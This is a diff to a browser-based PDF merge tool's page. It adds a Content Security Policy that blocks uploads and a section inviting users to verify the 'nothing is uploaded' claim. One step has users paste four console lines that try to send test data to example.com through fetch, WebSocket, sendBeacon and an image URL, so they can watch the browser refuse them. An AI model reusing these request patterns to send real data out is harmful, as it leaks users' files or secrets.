@@ -5,6 +5,34 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>PDF Handouts — merge PDFs and images into a printable handout</title>
 <meta name="description" content="Merge PDFs and screenshots into one printable handout with titles, footers and page numbers. Runs entirely in your browser — files are never uploaded.">
+
+<!--
+  This policy is the enforcement behind the "nothing is uploaded" claim. It is
+  applied by the browser, not by this page's own code, so the page cannot opt
+  out of it or quietly work around it.
+
+  connect-src 'self' is the important one: it blocks fetch, XMLHttpRequest,
+  WebSocket, EventSource and navigator.sendBeacon to every origin except the
+  one this page was served from. 'self' rather than 'none' only because the
+  WebAssembly module is itself fetched from here; the origin is GitHub Pages,
+  which serves static files and has nothing that could receive an upload.
+
+  form-action 'none' stops the page navigating your data anywhere as a form
+  submission, which is the other common way bytes leave a browser.
+
+  (frame-ancestors is deliberately absent — it is ignored in a meta tag and
+  only works as a real HTTP header, which GitHub Pages does not let us set.)
+-->
+<meta http-equiv="Content-Security-Policy" content="
+  default-src 'none';
+  script-src 'self' 'wasm-unsafe-eval';
+  style-src 'self';
+  img-src 'self' data:;
+  connect-src 'self';
+  form-action 'none';
+  base-uri 'none';
+  object-src 'none';
+">
 <link rel="stylesheet" href="style.css">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📄</text></svg>">
 </head>
@@ -19,6 +47,7 @@
   <p class="privacy" role="note">
     <strong>Your files never leave this page.</strong> Everything runs inside
     your browser — nothing is uploaded to a server.
+    <a href="#verify">Don't take our word for it →</a>
   </p>
 </header>
 
@@ -139,6 +168,85 @@
     </div>
 
     <div id="error" class="error" role="alert" hidden></div>
+  </section>
+
+  <!-- Verification -->
+  <section class="panel verify" id="verify" aria-labelledby="verify-heading">
+    <h2 id="verify-heading">Checking the claim yourself</h2>
+
+    <p>
+      A web page cannot prove its own innocence. Any reassuring badge it shows
+      you would look exactly the same on a page that <em>was</em> uploading your
+      files. So rather than ask you to trust a claim, here are four ways to
+      check it — none of which rely on anything this page tells you.
+    </p>
+
+    <ol class="checks">
+      <li>
+        <h3>Pull the plug</h3>
+        <p>
+          Once this page has loaded, disconnect from the internet — turn off
+          wi-fi, or use your browser's offline mode. Now add your files and
+          build. It still works. Nothing that needs a server could do that.
+        </p>
+      </li>
+
+      <li>
+        <h3>Watch the network</h3>
+        <p>
+          Open your browser's developer tools, go to the Network tab, clear it,
+          then build a handout. There are no requests. The only traffic this
+          page ever makes is fetching itself when it first loads.
+        </p>
+      </li>
+
+      <li>
+        <h3>Make it try to leak, and watch it fail</h3>
+        <p>
+          This page ships a
+          <a href="https://developer.mozilla.org/docs/Web/HTTP/CSP">Content
+          Security Policy</a> that the <em>browser</em> enforces — the page
+          cannot switch it off or work around it. You can read it near the top
+          of <a href="index.html">the page source</a>. To see it working, paste
+          this into the developer console and watch every attempt get refused:
+        </p>
+<pre><code>fetch('https://example.com/x', {method:'POST', body:'test'});
+new WebSocket('wss://example.com/x');
+navigator.sendBeacon('https://example.com/x', 'test');
+new Image().src = 'https://example.com/x?d=test';</code></pre>
+        <p class="aside">
+          Browsers make you type <code>allow pasting</code> in the console once
+          before they let you paste anything — a sensible precaution you should
+          keep. Nothing above sends real data; it only tries to reach a dummy
+          address so you can see the refusal.
+        </p>
+      </li>
+
+      <li>
+        <h3>Read it, or build it yourself</h3>
+        <p>
+          The whole thing is open source. The page is a few hundred lines of
+          plain JavaScript with no dependencies and no build step, so what you
+          see in the source is exactly what runs. The PDF engine is Rust
+          compiled to WebAssembly, and you can compile it yourself from the same
+          source and compare it against what is served here.
+        </p>
+        <p>
+          <a href="https://github.com/bridge-craftwork/pdf-handouts">Source on
+          GitHub</a> — the same tool is also a command-line program, if you would
+          rather not use a browser at all.
+        </p>
+      </li>
+    </ol>
+
+    <p class="aside">
+      One honest caveat: the policy permits requests back to the origin this
+      page came from, because that is how the WebAssembly module itself is
+      loaded. That origin is GitHub Pages, which serves static files and has
+      nothing on the other end that could receive an upload — but if that is not
+      good enough for your documents, use the command-line version, which has no
+      network code at all.
+    </p>
   </section>
 </main>
 
